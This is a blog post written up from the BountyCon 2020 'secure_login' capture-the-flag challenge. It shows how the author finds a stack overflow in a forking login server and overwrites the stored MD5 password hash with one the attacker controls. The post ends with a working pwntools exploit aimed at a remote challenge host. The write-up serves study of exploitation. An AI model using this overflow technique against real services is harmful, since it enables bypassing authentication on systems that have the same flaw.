---
layout: post
title:  "Secure login facebook bountycon 2020"
date:   2020-01-26 07:59:00
tags: ctf-writeup pwn
description: this article explains about secure-login from bountycon 2020.
categories: ctf
---

this is the only one pwn challenge on facebook bountycon 2020 , here is how i solve it.

the description :

    We developed a super secure login system, but unfortunately we aren't
    familiar with those newfangled memory-safe languages.


and we are given 64-bit ELF binary

    ./secure_login: ELF 64-bit LSB shared object,
    x86-64, version 1 (SYSV), dynamically linked,
    interpreter /lib64/l, BuildID[sha1]=e04815d2376518cc8b4295463f91479b57b8212a,
    for GNU/Linux 3.2.0, not stripped

after open it on ida , i found some function

<ul>
  <li>0x0000000000001269  wait_for_zombie</li>
  <li>0x0000000000001291  check_passwd</li>
  <li>0x0000000000001414  take_connections_forever</li>
  <li>0x00000000000014dc  main</li>
</ul>

let's see ```check_passwd()``` function

<img src="/images/secure-login/2020-01-26-204900_541x422_scrot.png" />

looks like our input will compare with v17 , i assume v17 and v18 is one variable
since this is md5

this is ```take_connections_forever()``` function

<img src="/images/secure-login/2020-01-26-195358_499x425_scrot.png"/>

look like we have to follow child process to debug ```check_passwd()```, since there's
```fork() ``` on

{% highlight c %}
if ( !fork() )
{
    close(a1);
    check_passwd(v2);
}
{% endhighlight %}
this is can be done by using command ```set follow-fork-mode child``` on gdb
and set breakpoint on ```check_passwd``` now lets try to run it

<img src="/images/secure-login/2020-01-26-200237_1366x768_scrot.png" />

the binary will made a connection on port 10000 , so i connect to this port using
```nc``` command, now lets set another breakpoint on <br/>
```0x00005555555553af <+286>:	call   0x555555555100 <memcmp@plt>```

and try to input ```AAAAAAAA```

<img src="/images/secure-login/2020-01-26-201111_313x87_scrot.png"/>

value on ```0x00007fffffffdda0``` is md5 from our input and ```0x00007fffffffdd90```
from the binary it self , lets see rsp

<img src="/images/secure-login/2020-01-26-201658_359x182_scrot.png" />

```
0x7fffffffdd10:	0x4141414141414141	0x000000000000000a <-- our input
0x7fffffffdd20:	0x0000000000000000	0x0000000000000000
0x7fffffffdd30:	0x0000000000000000	0x0000000000000000
0x7fffffffdd40:	0x0000000000000000	0x0000000000000000
0x7fffffffdd50:	0x0000000000000000	0x0000000000000000
0x7fffffffdd60:	0x0000000000000000	0x0000000000000000
0x7fffffffdd70:	0x0000000000000000	0x0000000000000000
0x7fffffffdd80:	0x0000000000000000	0x0000000000000000
0x7fffffffdd90:	0xa99dd1dbed586201	0xc6bbb0b969f29e4d <-- the md5 password
0x7fffffffdda0:	0xf5f48e17c7c26f5c	0x71750fc6d47e8ca8 <-- this is md5 from our input
```

let's input ```A*152```

<img src="/images/secure-login/2020-01-26-202640_682x750_scrot.png" />

look like we can control ```rsi``` and ```rcx``` , let's see the stack

<img src="/images/secure-login/2020-01-26-202935_353x180_scrot.png" />

now we can try to overwrite ```0x7fffffffdd90``` so the value will have same value
with our input , this is my exploit to solve this challenge

{% highlight python %}
from pwn import *

def main():
    # r = remote("127.0.0.1",10000)
    r  = remote("ec2-3-11-37-224.eu-west-2.compute.amazonaws.com",10000)
    # reached
    p = "A" * (152 - 32)
    p += "A" * 8
    p += p64(0x2016e548d3b035af)
    p += p64(0x0c5b389d3383e136)

    r.sendlineafter(":",p)
    r.interactive()

if __name__ == '__main__':
    main()

{% endhighlight %}

<img src="/images/secure-login/2020-01-26-203415_557x102_scrot.png" />
